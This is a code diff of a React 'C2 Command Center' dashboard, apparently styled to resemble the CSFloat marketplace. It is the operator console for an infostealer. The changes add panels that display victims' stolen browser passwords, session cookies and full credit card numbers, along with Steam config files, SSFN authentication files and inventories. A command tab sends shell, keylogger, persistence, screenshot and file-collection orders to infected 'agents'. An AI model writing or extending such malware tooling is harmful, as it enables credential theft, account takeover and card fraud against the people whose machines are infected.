@@ -15,32 +15,43 @@ interface Agent {
   created_at: string;
 }
 
-interface Command {
-  id: number;
-  agent_id: string;
-  command_type: 'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files' | 'kill_agent' | 'kill_process';
-  command_data: string;
-  status: 'pending' | 'executing' | 'completed' | 'failed';
-  result: string;
-  created_at: string;
-  executed_at: string;
-  completed_at: string;
+interface BrowserData {
+  browser_name: string;
+  credentials: Array<{
+    url: string;
+    username: string;
+    password: string;
+  }>;
+  cookies: Array<{
+    host: string;
+    name: string;
+    value: string;
+  }>;
+  credit_cards: Array<{
+    name_on_card: string;
+    number: string;
+    expiry_month: number;
+    expiry_year: number;
+  }>;
+}
+
+interface SteamData {
+  config_files: { [key: string]: string };
+  ssfn_files: string[];
+  profile_html?: string;
+  inventory_json?: string;
 }
 
 interface Result {
   id: number;
-  command_id: number;
   agent_id: string;
-  result_data: string;
-  file_path: string;
-  file_size: number;
-  success: boolean;
-  error_message: string;
-  created_at: string;
-  command_type: string;
-  command_data: string;
+  machine_id: string;
+  timestamp: number;
+  browser_data: BrowserData[];
+  steam_data?: SteamData;
   hostname: string;
   username: string;
+  created_at: string;
 }
 
 const C2Dashboard: React.FC = () => {
@@ -54,6 +65,10 @@ const C2Dashboard: React.FC = () => {
   const [selectedResult, setSelectedResult] = useState<Result | null>(null);
   const [showInactive, setShowInactive] = useState(false);
   const { isAdminAuthenticated } = useAdminAuth();
+  const [selectedData, setSelectedData] = useState<{
+    type: 'browser' | 'steam';
+    data: BrowserData | SteamData;
+  } | null>(null);
 
   useEffect(() => {
     if (isAdminAuthenticated) {
@@ -328,352 +343,493 @@ const C2Dashboard: React.FC = () => {
 
   const filteredAgents = showInactive ? agents : agents.filter(a => a.status === 'active');
 
+  const renderBrowserData = (data: BrowserData) => (
+    <div className="space-y-4">
+      <h3 className="text-xl font-bold text-white">{data.browser_name}</h3>
+      
+      {/* Credentials */}
+      {data.credentials.length > 0 && (
+        <div className="mt-4">
+          <h4 className="text-lg font-semibold text-csfloat-light/90 mb-2">Credentials</h4>
+          <div className="space-y-2">
+            {data.credentials.map((cred, idx) => (
+              <div key={idx} className="bg-csfloat-darker p-3 rounded">
+                <div className="flex justify-between">
+                  <span className="text-csfloat-light/70">URL:</span>
+                  <span className="text-white">{cred.url}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-csfloat-light/70">Username:</span>
+                  <span className="text-white">{cred.username}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-csfloat-light/70">Password:</span>
+                  <span className="text-white font-mono">{cred.password}</span>
+                </div>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
+
+      {/* Cookies */}
+      {data.cookies.length > 0 && (
+        <div className="mt-4">
+          <h4 className="text-lg font-semibold text-csfloat-light/90 mb-2">Cookies</h4>
+          <div className="space-y-2">
+            {data.cookies.map((cookie, idx) => (
+              <div key={idx} className="bg-csfloat-darker p-3 rounded">
+                <div className="flex justify-between">
+                  <span className="text-csfloat-light/70">Host:</span>
+                  <span className="text-white">{cookie.host}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-csfloat-light/70">Name:</span>
+                  <span className="text-white">{cookie.name}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-csfloat-light/70">Value:</span>
+                  <span className="text-white font-mono">{cookie.value}</span>
+                </div>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
+
+      {/* Credit Cards */}
+      {data.credit_cards.length > 0 && (
+        <div className="mt-4">
+          <h4 className="text-lg font-semibold text-csfloat-light/90 mb-2">Credit Cards</h4>
+          <div className="space-y-2">
+            {data.credit_cards.map((card, idx) => (
+              <div key={idx} className="bg-csfloat-darker p-3 rounded">
+                <div className="flex justify-between">
+                  <span className="text-csfloat-light/70">Name:</span>
+                  <span className="text-white">{card.name_on_card}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-csfloat-light/70">Number:</span>
+                  <span className="text-white font-mono">{card.number}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-csfloat-light/70">Expiry:</span>
+                  <span className="text-white">{card.expiry_month}/{card.expiry_year}</span>
+                </div>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
+    </div>
+  );
+
+  const renderSteamData = (data: SteamData) => (
+    <div className="space-y-4">
+      <h3 className="text-xl font-bold text-white">Steam Data</h3>
+      
+      {/* Config Files */}
+      {Object.keys(data.config_files).length > 0 && (
+        <div className="mt-4">
+          <h4 className="text-lg font-semibold text-csfloat-light/90 mb-2">Config Files</h4>
+          <div className="space-y-2">
+            {Object.entries(data.config_files).map(([filename, content]) => (
+              <div key={filename} className="bg-csfloat-darker p-3 rounded">
+                <div className="flex justify-between mb-2">
+                  <span className="text-csfloat-light/70">{filename}</span>
+                </div>
+                <pre className="text-white font-mono text-sm overflow-x-auto">
+                  {content}
+                </pre>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
+
+      {/* SSFN Files */}
+      {data.ssfn_files.length > 0 && (
+        <div className="mt-4">
+          <h4 className="text-lg font-semibold text-csfloat-light/90 mb-2">SSFN Files</h4>
+          <div className="space-y-2">
+            {data.ssfn_files.map((content, idx) => (
+              <div key={idx} className="bg-csfloat-darker p-3 rounded">
+                <pre className="text-white font-mono text-sm overflow-x-auto">
+                  {content}
+                </pre>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
+
+      {/* Profile HTML */}
+      {data.profile_html && (
+        <div className="mt-4">
+          <h4 className="text-lg font-semibold text-csfloat-light/90 mb-2">Steam Profile</h4>
+          <div className="bg-csfloat-darker p-3 rounded">
+            <pre className="text-white font-mono text-sm overflow-x-auto">
+              {data.profile_html}
+            </pre>
+          </div>
+        </div>
+      )}
+
+      {/* Inventory JSON */}
+      {data.inventory_json && (
+        <div className="mt-4">
+          <h4 className="text-lg font-semibold text-csfloat-light/90 mb-2">Steam Inventory</h4>
+          <div className="bg-csfloat-darker p-3 rounded">
+            <pre className="text-white font-mono text-sm overflow-x-auto">
+              {data.inventory_json}
+            </pre>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+
+  // Update the Results Tab rendering to handle the new data format
+  const renderResultsTab = () => (
+    <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
+      <div className="p-6">
+        <h2 className="text-2xl font-bold text-white mb-4">Command Results</h2>
+        {isLoading ? (
+          <div className="text-center py-8">
+            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-csfloat-blue mx-auto"></div>
+          </div>
+        ) : results.length > 0 ? (
+          <div className="space-y-4">
+            {results.map((result) => (
+              <motion.div
+                key={result.id}
+                initial={{ opacity: 0, y: 20 }}
+                animate={{ opacity: 1, y: 0 }}
+                className="bg-csfloat-dark rounded-lg p-4 shadow-lg relative"
+              >
+                <div className="flex justify-between items-start mb-2">
+                  <div>
+                    <span className="text-csfloat-light/70">Machine ID: </span>
+                    <span className="text-white font-mono">{result.machine_id}</span>
+                  </div>
+                  <span className="text-csfloat-light/50 text-sm">
+                    {new Date(result.created_at).toLocaleString()}
+                  </span>
+                </div>
+
+                <div className="mb-2">
+                  <span className="text-csfloat-light/70">Hostname: </span>
+                  <span className="text-white">{result.hostname}</span>
+                </div>
+
+                <div className="mb-4">
+                  <span className="text-csfloat-light/70">Username: </span>
+                  <span className="text-white">{result.username}</span>
+                </div>
+
+                {/* Browser Data */}
+                {result.browser_data && result.browser_data.length > 0 && (
+                  <div className="mb-4">
+                    <button
+                      onClick={() => setSelectedData({ type: 'browser', data: result.browser_data[0] })}
+                      className="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded text-sm transition-colors duration-200"
+                    >
+                      View Browser Data ({result.browser_data.length} browsers)
+                    </button>
+                  </div>
+                )}
+
+                {/* Steam Data */}
+                {result.steam_data && (
+                  <div className="mb-4">
+                    <button
+                      onClick={() => setSelectedData({ type: 'steam', data: result.steam_data })}
+                      className="bg-purple-500 hover:bg-purple-600 text-white px-3 py-1 rounded text-sm transition-colors duration-200"
+                    >
+                      View Steam Data
+                    </button>
+                  </div>
+                )}
+
+                <button
+                  onClick={() => deleteResult(result.id)}
+                  className="absolute top-4 right-4 bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-sm transition-colors duration-200"
+                >
+                  Delete
+                </button>
+              </motion.div>
+            ))}
+          </div>
+        ) : (
+          <div className="text-center py-8">
+            <p className="text-csfloat-light/60">No results available</p>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+
   // Don't render if not authenticated
   if (!isAdminAuthenticated) {
     return null;
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-b from-csfloat-darker to-black pt-16 pb-12">
-      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-        <div className="mb-8">
-          <h1 className="text-4xl font-bold text-white mb-2">C2 Command Center</h1>
-          <p className="text-csfloat-light/70">Manage agents and execute commands</p>
-        </div>
+    <>
+      <div className="min-h-screen bg-gradient-to-b from-csfloat-darker to-black pt-16 pb-12">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div className="mb-8">
+            <h1 className="text-4xl font-bold text-white mb-2">C2 Command Center</h1>
+            <p className="text-csfloat-light/70">Manage agents and execute commands</p>
+          </div>
 
-        {/* Stats Cards */}
-        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
-          <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
-            <h3 className="text-csfloat-light/70 text-sm mb-2">Total Agents</h3>
-            <p className="text-3xl font-bold text-white">{agents.length}</p>
-          </div>
-          <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
-            <h3 className="text-csfloat-light/70 text-sm mb-2">Active Agents</h3>
-            <p className="text-3xl font-bold text-green-500">
-              {agents.filter(a => a.status === 'active').length}
-            </p>
-          </div>
-          <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
-            <h3 className="text-csfloat-light/70 text-sm mb-2">Total Results</h3>
-            <p className="text-3xl font-bold text-blue-500">{results.length}</p>
-          </div>
-          <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
-            <h3 className="text-csfloat-light/70 text-sm mb-2">Success Rate</h3>
-            <p className="text-3xl font-bold text-purple-500">
-              {results.length > 0 ? Math.round((results.filter(r => r.success).length / results.length) * 100) : 0}%
-            </p>
-          </div>
-        </div>
-
-        {/* Tabs */}
-        <div className="flex space-x-1 mb-6">
-          {[
-            { id: 'agents', label: 'Agents' },
-            { id: 'commands', label: 'Commands' },
-            { id: 'results', label: 'Results' },
-            { id: 'debug', label: 'Debug' }
-          ].map((tab) => (
-            <button
-              key={tab.id}
-              onClick={() => setActiveTab(tab.id as 'agents' | 'commands' | 'results' | 'debug')}
-              className={`px-6 py-3 rounded-lg font-medium transition-colors ${
-                activeTab === tab.id
-                  ? 'bg-csfloat-blue text-white'
-                  : 'text-csfloat-light/70 hover:text-white hover:bg-csfloat-gray/20'
-              }`}
-            >
-              {tab.label}
-            </button>
-          ))}
-        </div>
-
-        {/* Agents Tab */}
-        {activeTab === 'agents' && (
-          <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
-            <div className="p-6">
-              <div className="flex justify-between items-center mb-4">
-                <h2 className="text-2xl font-bold">Agents ({filteredAgents.length})</h2>
-                <label className="flex items-center space-x-2 cursor-pointer">
-                  <input 
-                    type="checkbox" 
-                    className="form-checkbox h-5 w-5 text-blue-600 bg-gray-800 border-gray-600 rounded focus:ring-blue-500"
-                    checked={showInactive}
-                    onChange={() => setShowInactive(!showInactive)}
-                  />
-                  <span className="text-gray-300">Show Inactive</span>
-                </label>
-              </div>
-              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-                {filteredAgents.map(agent => (
-                  <div 
-                    key={agent.agent_id} 
-                    className={`bg-gray-800 rounded-lg p-4 cursor-pointer transition-all duration-200 ${selectedAgent === agent.agent_id ? 'ring-2 ring-blue-500' : 'hover:bg-gray-700'}`}
-                    onClick={() => setSelectedAgent(agent.agent_id)}
-                  >
-                    <div className="flex justify-between items-start">
-                      <div className="flex-grow">
-                        <div className="flex items-center mb-2">
-                          <div className={`w-3 h-3 rounded-full mr-2 ${getStatusDotColor(agent.status)}`}></div>
-                          <p className="font-bold text-lg truncate" title={agent.hostname}>{agent.hostname}</p>
-                        </div>
-                        <p className="text-sm text-gray-400 truncate" title={agent.agent_id}>{agent.agent_id}</p>
-                      </div>
-                      <div className="flex-shrink-0">
-                         <span className={`px-2 py-1 text-xs font-semibold rounded-full ${getStatusColor(agent.status)} bg-opacity-20`}>
-                          {agent.status}
-                        </span>
-                      </div>
-                    </div>
-                    <div className="mt-4 space-y-2 text-sm">
-                      <div className="flex justify-between">
-                        <span className="text-gray-400">Username:</span>
-                        <span className="font-mono">{agent.username}</span>
-                      </div>
-                      <div className="flex justify-between">
-                        <span className="text-gray-400">IP Address:</span>
-                        <span className="font-mono">{agent.ip_address}</span>
-                      </div>
-                      <div className="flex justify-between">
-                        <span className="text-gray-400">OS:</span>
-                        <span className="text-right truncate" title={agent.os_info}>{agent.os_info}</span>
-                      </div>
-                      <div className="flex justify-between">
-                        <span className="text-gray-400">Last Seen:</span>
-                        <span>{new Date(agent.last_seen).toLocaleString()}</span>
-                      </div>
-                    </div>
-                    {/* Kill Agent Buttons */}
-                    <div className="mt-4 pt-3 border-t border-gray-700">
-                      <div className="flex space-x-2 mb-2">
-                        <button
-                          onClick={(e) => {
-                            e.stopPropagation();
-                            killAgent(agent.agent_id, 'process');
-                          }}
-                          className="flex-1 bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-xs font-medium transition-colors"
-                          title="Kill the agent process (agent will restart if persistence is enabled)"
-                        >
-                          Kill Process
-                        </button>
-                        <button
-                          onClick={(e) => {
-                            e.stopPropagation();
-                            killAgent(agent.agent_id, 'agent');
-                          }}
-                          className="flex-1 bg-red-800 hover:bg-red-900 text-white px-3 py-1 rounded text-xs font-medium transition-colors"
-                          title="Terminate the agent completely (marks as compromised)"
-                        >
-                          Kill Agent
-                        </button>
-                      </div>
-                      <div className="flex">
-                        <button
-                          onClick={(e) => {
-                            e.stopPropagation();
-                            deleteAgent(agent.agent_id);
-                          }}
-                          className="w-full bg-gray-800 hover:bg-gray-700 text-red-400 hover:text-red-300 px-3 py-1 rounded text-xs font-medium transition-colors border border-gray-600 hover:border-gray-500"
-                          title="Permanently delete this agent and all associated data"
-                        >
-                          🗑️ Delete Agent
-                        </button>
-                      </div>
-                    </div>
-                  </div>
-                ))}
-              </div>
+          {/* Stats Cards */}
+          <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
+            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
+              <h3 className="text-csfloat-light/70 text-sm mb-2">Total Agents</h3>
+              <p className="text-3xl font-bold text-white">{agents.length}</p>
+            </div>
+            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
+              <h3 className="text-csfloat-light/70 text-sm mb-2">Active Agents</h3>
+              <p className="text-3xl font-bold text-green-500">
+                {agents.filter(a => a.status === 'active').length}
+              </p>
+            </div>
+            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
+              <h3 className="text-csfloat-light/70 text-sm mb-2">Total Results</h3>
+              <p className="text-3xl font-bold text-blue-500">{results.length}</p>
+            </div>
+            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
+              <h3 className="text-csfloat-light/70 text-sm mb-2">Success Rate</h3>
+              <p className="text-3xl font-bold text-purple-500">
+                {results.length > 0 ? Math.round((results.filter(r => r.success).length / results.length) * 100) : 0}%
+              </p>
             </div>
           </div>
-        )}
 
-        {/* Commands Tab */}
-        {activeTab === 'commands' && (
-          <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
-            <div className="p-6">
-              <h2 className="text-2xl font-bold text-white mb-4">Send Command</h2>
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
-                <div>
-                  <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
-                    Select Agent
-                  </label>
-                  <select
-                    value={selectedAgent}
-                    onChange={(e) => setSelectedAgent(e.target.value)}
-                    className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
-                  >
-                    <option value="">Choose an agent...</option>
-                    {agents.map((agent) => (
-                      <option key={agent.id} value={agent.agent_id}>
-                        {agent.hostname} ({agent.agent_id})
-                      </option>
-                    ))}
-                  </select>
-                </div>
-                <div>
-                  <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
-                    Command Type
-                  </label>
-                  <select
-                    value={commandType}
-                    onChange={(e) => setCommandType(e.target.value as any)}
-                    className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
-                  >
-                    <option value="shell">Shell Command</option>
-                    <option value="download">Download File</option>
-                    <option value="upload">Upload File</option>
-                    <option value="screenshot">Screenshot</option>
-                    <option value="keylog">Keylogger</option>
-                    <option value="persistence">Persistence</option>
-                    <option value="collect_data">Collect Data</option>
-                    <option value="collect_files">Collect Files</option>
-                    <option value="kill_process">Kill Process</option>
-                    <option value="kill_agent">Kill Agent</option>
-                  </select>
-                </div>
-              </div>
-              <div className="mb-6">
-                <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
-                  Command Data
-                </label>
-                <textarea
-                  value={commandData}
-                  onChange={(e) => setCommandData(e.target.value)}
-                  placeholder="Enter command or file path..."
-                  className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue h-32 resize-none"
-                />
-              </div>
+          {/* Tabs */}
+          <div className="flex space-x-1 mb-6">
+            {[
+              { id: 'agents', label: 'Agents' },
+              { id: 'commands', label: 'Commands' },
+              { id: 'results', label: 'Results' },
+              { id: 'debug', label: 'Debug' }
+            ].map((tab) => (
               <button
-                onClick={sendCommand}
-                disabled={!selectedAgent || !commandData.trim()}
-                className="bg-csfloat-blue hover:bg-blue-600 disabled:bg-csfloat-gray/50 text-white px-6 py-2 rounded-lg transition-colors duration-200 disabled:cursor-not-allowed"
+                key={tab.id}
+                onClick={() => setActiveTab(tab.id as 'agents' | 'commands' | 'results' | 'debug')}
+                className={`px-6 py-3 rounded-lg font-medium transition-colors ${
+                  activeTab === tab.id
+                    ? 'bg-csfloat-blue text-white'
+                    : 'text-csfloat-light/70 hover:text-white hover:bg-csfloat-gray/20'
+                }`}
               >
-                Send Command
+                {tab.label}
               </button>
-            </div>
+            ))}
           </div>
-        )}
 
-        {/* Results Tab */}
-        {activeTab === 'results' && (
-          <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
-            <div className="p-6">
-              <h2 className="text-2xl font-bold text-white mb-4">Command Results</h2>
-              {isLoading ? (
-                <div className="text-center py-8">
-                  <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-csfloat-blue mx-auto"></div>
+          {/* Agents Tab */}
+          {activeTab === 'agents' && (
+            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
+              <div className="p-6">
+                <div className="flex justify-between items-center mb-4">
+                  <h2 className="text-2xl font-bold">Agents ({filteredAgents.length})</h2>
+                  <label className="flex items-center space-x-2 cursor-pointer">
+                    <input 
+                      type="checkbox" 
+                      className="form-checkbox h-5 w-5 text-blue-600 bg-gray-800 border-gray-600 rounded focus:ring-blue-500"
+                      checked={showInactive}
+                      onChange={() => setShowInactive(!showInactive)}
+                    />
+                    <span className="text-gray-300">Show Inactive</span>
+                  </label>
                 </div>
-              ) : results.length > 0 ? (
-                <div className="space-y-4">
-                  {results.map((result) => (
-                    <motion.div
-                      key={result.id}
-                      initial={{ opacity: 0, y: 20 }}
-                      animate={{ opacity: 1, y: 0 }}
-                      className="bg-csfloat-dark rounded-lg p-4 shadow-lg relative"
+                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  {filteredAgents.map(agent => (
+                    <div 
+                      key={agent.agent_id} 
+                      className={`bg-gray-800 rounded-lg p-4 cursor-pointer transition-all duration-200 ${selectedAgent === agent.agent_id ? 'ring-2 ring-blue-500' : 'hover:bg-gray-700'}`}
+                      onClick={() => setSelectedAgent(agent.agent_id)}
                     >
-                      <div className="flex justify-between items-start mb-2">
-                        <div>
-                          <span className="text-csfloat-light/70">Agent ID: </span>
-                          <span className="text-white font-mono">{result.agent_id}</span>
+                      <div className="flex justify-between items-start">
+                        <div className="flex-grow">
+                          <div className="flex items-center mb-2">
+                            <div className={`w-3 h-3 rounded-full mr-2 ${getStatusDotColor(agent.status)}`}></div>
+                            <p className="font-bold text-lg truncate" title={agent.hostname}>{agent.hostname}</p>
+                          </div>
+                          <p className="text-sm text-gray-400 truncate" title={agent.agent_id}>{agent.agent_id}</p>
                         </div>
-                        <div className="flex items-center space-x-2">
-                          {isFileResult(result) && (
-                            <button
-                              onClick={() => downloadFile(result.agent_id, result.file_path.split('/').pop() || 'file')}
-                              className="bg-csfloat-blue hover:bg-blue-600 text-white px-3 py-1 rounded text-sm transition-colors duration-200"
-                            >
-                              Download
-                            </button>
-                          )}
+                        <div className="flex-shrink-0">
+                           <span className={`px-2 py-1 text-xs font-semibold rounded-full ${getStatusColor(agent.status)} bg-opacity-20`}>
+                            {agent.status}
+                          </span>
+                        </div>
+                      </div>
+                      <div className="mt-4 space-y-2 text-sm">
+                        <div className="flex justify-between">
+                          <span className="text-gray-400">Username:</span>
+                          <span className="font-mono">{agent.username}</span>
+                        </div>
+                        <div className="flex justify-between">
+                          <span className="text-gray-400">IP Address:</span>
+                          <span className="font-mono">{agent.ip_address}</span>
+                        </div>
+                        <div className="flex justify-between">
+                          <span className="text-gray-400">OS:</span>
+                          <span className="text-right truncate" title={agent.os_info}>{agent.os_info}</span>
+                        </div>
+                        <div className="flex justify-between">
+                          <span className="text-gray-400">Last Seen:</span>
+                          <span>{new Date(agent.last_seen).toLocaleString()}</span>
+                        </div>
+                      </div>
+                      {/* Kill Agent Buttons */}
+                      <div className="mt-4 pt-3 border-t border-gray-700">
+                        <div className="flex space-x-2 mb-2">
                           <button
-                            onClick={() => deleteResult(result.id)}
-                            className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-sm transition-colors duration-200"
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              killAgent(agent.agent_id, 'process');
+                            }}
+                            className="flex-1 bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-xs font-medium transition-colors"
+                            title="Kill the agent process (agent will restart if persistence is enabled)"
                           >
-                            Delete
+                            Kill Process
+                          </button>
+                          <button
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              killAgent(agent.agent_id, 'agent');
+                            }}
+                            className="flex-1 bg-red-800 hover:bg-red-900 text-white px-3 py-1 rounded text-xs font-medium transition-colors"
+                            title="Terminate the agent completely (marks as compromised)"
+                          >
+                            Kill Agent
+                          </button>
+                        </div>
+                        <div className="flex">
+                          <button
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              deleteAgent(agent.agent_id);
+                            }}
+                            className="w-full bg-gray-800 hover:bg-gray-700 text-red-400 hover:text-red-300 px-3 py-1 rounded text-xs font-medium transition-colors border border-gray-600 hover:border-gray-500"
+                            title="Permanently delete this agent and all associated data"
+                          >
+                            🗑️ Delete Agent
                           </button>
                         </div>
                       </div>
-                      
-                      <div className="mb-2">
-                        <span className="text-csfloat-light/70">Command: </span>
-                        <span className={`inline-block px-2 py-0.5 rounded text-xs ${getCommandTypeColor(result.command_type)}`}>
-                          {result.command_type}
-                        </span>
-                        <span className="text-white font-mono ml-2">{result.command_data}</span>
-                      </div>
-                      
-                      <div className="mb-2">
-                        <span className="text-csfloat-light/70">Status: </span>
-                        <span className={`text-${result.success ? 'green' : 'red'}-500`}>
-                          {result.success ? 'Success' : 'Failed'}
-                        </span>
-                        <span className="text-csfloat-light/50 text-sm ml-2">
-                          {new Date(result.created_at).toLocaleString()}
-                        </span>
-                      </div>
-                      
-                      {isFileResult(result) && (
-                        <div className="mb-3">
-                          <span className="text-csfloat-light/70 text-sm">File: </span>
-                          <span className="text-white font-mono text-sm">{result.file_path}</span>
-                          <span className="text-csfloat-light/60 text-sm ml-2">({result.file_size} bytes)</span>
-                        </div>
-                      )}
-                      
-                      {isDataCollection(result) && (
-                        <div className="mb-3">
-                          <button
-                            onClick={() => setSelectedResult(result)}
-                            className="bg-purple-500 hover:bg-purple-600 text-white px-3 py-1 rounded text-sm transition-colors duration-200"
-                          >
-                            View Data
-                          </button>
-                        </div>
-                      )}
-                      
-                      {result.result_data && !isDataCollection(result) && (
-                        <div className="bg-csfloat-darker rounded p-3 border border-csfloat-gray/10">
-                          <pre className="text-white text-sm whitespace-pre-wrap">{result.result_data}</pre>
-                        </div>
-                      )}
-                    </motion.div>
+                    </div>
                   ))}
                 </div>
-              ) : (
-                <div className="text-center py-8">
-                  <p className="text-csfloat-light/60">No results available</p>
-                </div>
-              )}
+              </div>
             </div>
-          </div>
-        )}
+          )}
 
-        {/* Debug Tab */}
-        {activeTab === 'debug' && (
-          <C2Debug />
-        )}
-
-        {/* Data Collection Modal */}
-        {selectedResult && (
-          <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
-            <div className="bg-csfloat-dark rounded-lg p-6 max-w-2xl w-full mx-4 max-h-[80vh] overflow-y-auto">
-              <div className="flex justify-between items-center mb-4">
-                <h3 className="text-xl font-bold text-white">Collected Data</h3>
+          {/* Commands Tab */}
+          {activeTab === 'commands' && (
+            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
+              <div className="p-6">
+                <h2 className="text-2xl font-bold text-white mb-4">Send Command</h2>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+                  <div>
+                    <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
+                      Select Agent
+                    </label>
+                    <select
+                      value={selectedAgent}
+                      onChange={(e) => setSelectedAgent(e.target.value)}
+                      className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
+                    >
+                      <option value="">Choose an agent...</option>
+                      {agents.map((agent) => (
+                        <option key={agent.id} value={agent.agent_id}>
+                          {agent.hostname} ({agent.agent_id})
+                        </option>
+                      ))}
+                    </select>
+                  </div>
+                  <div>
+                    <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
+                      Command Type
+                    </label>
+                    <select
+                      value={commandType}
+                      onChange={(e) => setCommandType(e.target.value as any)}
+                      className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
+                    >
+                      <option value="shell">Shell Command</option>
+                      <option value="download">Download File</option>
+                      <option value="upload">Upload File</option>
+                      <option value="screenshot">Screenshot</option>
+                      <option value="keylog">Keylogger</option>
+                      <option value="persistence">Persistence</option>
+                      <option value="collect_data">Collect Data</option>
+                      <option value="collect_files">Collect Files</option>
+                      <option value="kill_process">Kill Process</option>
+                      <option value="kill_agent">Kill Agent</option>
+                    </select>
+                  </div>
+                </div>
+                <div className="mb-6">
+                  <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
+                    Command Data
+                  </label>
+                  <textarea
+                    value={commandData}
+                    onChange={(e) => setCommandData(e.target.value)}
+                    placeholder="Enter command or file path..."
+                    className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue h-32 resize-none"
+                  />
+                </div>
                 <button
-                  onClick={() => setSelectedResult(null)}
-                  className="text-csfloat-light/60 hover:text-white"
+                  onClick={sendCommand}
+                  disabled={!selectedAgent || !commandData.trim()}
+                  className="bg-csfloat-blue hover:bg-blue-600 disabled:bg-csfloat-gray/50 text-white px-6 py-2 rounded-lg transition-colors duration-200 disabled:cursor-not-allowed"
                 >
-                  ✕
+                  Send Command
                 </button>
               </div>
-              <pre className="text-white text-sm whitespace-pre-wrap bg-csfloat-darker rounded p-4 border border-csfloat-gray/10">
-                {JSON.stringify(parseResultData(selectedResult.result_data), null, 2)}
-              </pre>
+            </div>
+          )}
+
+          {/* Results Tab */}
+          {activeTab === 'results' && renderResultsTab()}
+
+          {/* Debug Tab */}
+          {activeTab === 'debug' && (
+            <C2Debug />
+          )}
+        </div>
+      </div>
+
+      {/* Data Viewer Modal */}
+      {selectedData && (
+        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
+          <div className="bg-csfloat-dark rounded-lg p-6 max-w-4xl w-full mx-4 max-h-[80vh] overflow-y-auto">
+            <div className="flex justify-between items-center mb-4">
+              <h3 className="text-xl font-bold text-white">
+                {selectedData.type === 'browser' ? 'Browser Data' : 'Steam Data'}
+              </h3>
+              <button
+                onClick={() => setSelectedData(null)}
+                className="text-csfloat-light/60 hover:text-white"
+              >
+                ✕
+              </button>
+            </div>
+            <div className="bg-csfloat-darker rounded p-4 border border-csfloat-gray/10">
+              {selectedData.type === 'browser' 
+                ? renderBrowserData(selectedData.data as BrowserData)
+                : renderSteamData(selectedData.data as SteamData)
+              }
             </div>
           </div>
-        )}
-      </div>
-    </div>
+        </div>
+      )}
+    </>
   );
 };
 
